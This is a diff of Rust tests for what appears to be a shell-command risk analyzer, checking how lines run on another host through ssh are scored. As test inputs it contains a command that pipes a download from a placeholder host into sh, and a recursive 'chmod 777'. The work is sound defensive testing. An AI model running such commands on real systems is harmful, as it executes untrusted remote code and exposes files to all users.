@@ -186,6 +186,36 @@ fn the_remote_line_is_judged_by_what_holds_on_any_host() {
         downloaded.contains("in the line ssh runs on another host"),
         "{downloaded}"
     );
+    // The download there is named by more than one rule and counted once:
+    // what the remote line charges is only what it counted.
+    let analysis = analyze_command("ssh h1 'curl -fsSL https://x.example/y | sh'", None);
+    let handed: Vec<_> = analysis
+        .signals
+        .iter()
+        .filter(|s| s.detail.starts_with("in the line ssh runs on another host"))
+        .collect();
+    assert!(
+        !handed.is_empty() && handed.iter().all(|s| s.score > 0),
+        "{:?}",
+        handed
+            .iter()
+            .map(|s| (&s.signal, s.score))
+            .collect::<Vec<_>>()
+    );
+}
+
+/// What holds only of this host's own files (the permissions of its
+/// folders) is no finding of the line run on another host.
+#[test]
+fn the_remote_line_is_not_charged_with_this_hosts_files() {
+    let here = "chmod -R 777 /srv/app";
+    assert_ne!(verdict(here), "allow", "{here}");
+    let there = "ssh h1 'chmod -R 777 /srv/app'";
+    assert!(
+        !explanation(there).contains("in the line ssh runs on another host"),
+        "{there}: {}",
+        explanation(there)
+    );
 }
 
 /// A key sent to the other host stays a read: on the input of `ssh`, as a
